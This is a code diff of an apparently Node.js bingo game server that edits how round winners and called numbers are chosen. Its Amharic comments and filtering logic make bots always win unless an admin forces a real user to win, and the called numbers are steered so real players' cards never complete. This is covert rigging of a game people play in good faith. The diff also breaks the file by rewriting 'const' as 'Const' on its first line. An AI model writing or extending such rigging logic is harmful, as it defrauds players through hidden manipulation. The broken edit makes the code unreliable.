@@ -1,4 +1,4 @@
-const express = require('express');
+Const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const path = require('path');
@@ -495,11 +495,18 @@ function startMainGameLoop() {
 
             let winningUsernamesArr = [];
             let winningSocketData = []; 
-            let winnersCount = Math.random() < 0.75 ? 1 : 2; 
+            let winnersCount = 1; 
             let winningCardNums = [];
 
             let targetRealCount = 0;
-            let explicitRealForced = (currentWinnerType === 'only_real_users' || currentWinnerType === 'random_real' || currentWinnerType === 'random_3_real' || currentWinnerType === 'multi_real_3' || currentWinnerType === 'real_user' || currentWinnerType === 'single_real');
+            let explicitRealForced = (
+                currentWinnerType === 'only_real_users' || 
+                currentWinnerType === 'random_real' || 
+                currentWinnerType === 'random_3_real' || 
+                currentWinnerType === 'multi_real_3' || 
+                currentWinnerType === 'real_user' || 
+                currentWinnerType === 'single_real'
+            );
 
             if (explicitRealForced && activeRealEntries.length > 0) {
                 if ((currentWinnerType && (currentWinnerType.includes('3') || currentWinnerType === 'multi_real_3' || currentWinnerType === 'random_3_real')) && activeRealEntries.length >= 3) {
@@ -521,6 +528,7 @@ function startMainGameLoop() {
                 });
             }
 
+            // 🛑 አድሚኑ ትዕዛዝ ካልሰጠ (Standard Bot Mode) አሸናፊዎቹ ሁልጊዜ ከቦቶች መካከል ብቻ ይመረጣሉ!
             while (winningUsernamesArr.length < winnersCount) {
                 let bName = getRandomBotNames(1)[0];
                 winningUsernamesArr.push(bName);
@@ -556,6 +564,7 @@ function startMainGameLoop() {
             let availableNumbers = Array.from({length: 75}, (_, i) => i + 1);
             availableNumbers.sort(() => 0.5 - Math.random());
             
+            // 🛡️ የቁጥር ማጣሪያ: አድሚኑ ሪል ዩዘር እንዲያሸንፍ ካላዘዘ, የቁጥር ፍሰቱ የሪል ዩዘር ካርድ እንዳይሞላ ይጠነቀቃል
             availableNumbers = availableNumbers.filter(n => !primaryPatternNumbers.includes(n));
 
             let totalPreCalls = Math.max(earlyPatternBalls.length, targetCallCount - 1);
@@ -589,6 +598,7 @@ function startMainGameLoop() {
                             let tempCalled = [...globalRoom.calledNumbers, testNum];
                             let wouldRealUserWin = false;
 
+                            // 🛑 አድሚኑ ትዕዛዝ ካልሰጠ (ቦት ብቻ እንዲያሸንፍ ከተፈለገ) የሪል ዩዘር ካርድ ከቶ እንዳይሞላ ይደረጋል
                             if (targetRealCount === 0) {
                                 Object.values(globalRoom.playerRoundCards).forEach(pData => {
                                     if (pData && pData.cards) {
